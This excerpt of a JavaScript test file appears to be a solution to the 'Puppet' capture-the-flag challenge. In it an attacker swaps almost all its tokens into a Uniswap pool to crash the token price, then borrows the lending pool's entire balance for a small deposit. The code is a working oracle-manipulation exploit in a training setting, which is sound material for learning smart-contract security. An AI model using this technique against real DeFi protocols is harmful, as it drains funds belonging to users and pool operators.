...
describe('[Challenge] Puppet', function () {
    ...
    it('Exploit', async function () {
        ...
        const initDepositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        console.log("Before WEI: ", initDepositRequired.toString())
        
        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE)
        // save one to greater than 'POOL_INITIAL_TOKEN_BALANCE'
        await expect(
            this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), 1, ddl)
        ).to.not.be.reverted

        const afterDepositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        console.log("After WEI: ", afterDepositRequired.toString())
        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: afterDepositRequired})
    });
